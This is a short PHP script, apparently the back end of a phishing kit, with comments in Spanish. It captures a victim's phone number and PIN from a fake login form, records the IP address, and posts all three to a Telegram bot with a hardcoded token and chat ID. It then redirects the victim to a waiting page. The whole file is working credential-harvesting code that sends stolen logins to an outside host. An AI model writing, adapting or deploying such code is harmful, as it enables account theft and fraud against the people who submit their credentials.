<?php
// Recibir los datos del formulario
$numero = htmlspecialchars($_POST['numero']);
$pin = htmlspecialchars($_POST['pin']);

// Obtener la dirección IP del usuario
$userIP = $_SERVER['REMOTE_ADDR'];

// Formatear el mensaje a enviar
$message = "📌 *Nuevo inicio de sesión recibido* 📌\n\n";
$message .= "📱 *Número*: $numero\n";
$message .= "🔒 *PIN*: $pin\n";
$message .= "🌐 *IP*: $userIP\n";

// Configuración del bot de Telegram
$botToken = '7722702763:AAHt3VkpAiZ0kcz-HO5toJpHecoaM2Hny3k'; // Reemplaza con el token de tu bot
$chatId = '-4783394331'; // Reemplaza con tu ID de chat o canal

// Enviar los datos a Telegram
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// Usar cURL para enviar el mensaje
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Redirigir al usuario a otra página (por ejemplo, espere.php)
header('Location: espere.php');
exit;
?>
